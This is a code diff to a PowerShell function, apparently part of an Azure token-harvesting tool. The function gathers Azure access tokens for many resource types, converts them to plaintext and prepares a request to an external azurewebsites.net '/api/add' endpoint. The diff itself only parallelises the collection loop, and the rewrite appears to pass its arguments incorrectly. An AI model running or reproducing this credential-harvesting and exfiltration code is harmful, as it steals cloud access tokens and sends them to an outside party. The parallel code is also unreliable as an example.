@@ -45,7 +45,7 @@ function AccessToken {
     Clear-Host
 
     try {
-        $tokens = @()
+        $tokens = [System.Collections.Concurrent.ConcurrentBag[PSCustomObject]]::new()
 
 $logo = @"
   ______      __              ____
@@ -59,7 +59,10 @@ $logo = @"
 "@
 
         Write-Host $logo
-        foreach ($resourceTypeName in $resourceTypeNames) {
+
+        $resourceTypeNames | ForEach-Object -Parallel {
+            param ($resourceTypeName, $tokens)
+
             try {
                 $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString -ErrorAction SilentlyContinue)
 
@@ -68,13 +71,13 @@ $logo = @"
                         Resource = $resourceTypeName
                         Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
                     }
-                    $tokens += $tokenObject
+                    $tokens.Add($tokenObject)
                 }
             }
             catch {
                 Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
             }
-        }
+        } -ArgumentList $_, $tokens
 
         $requestParam = @{
             Uri    = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?'
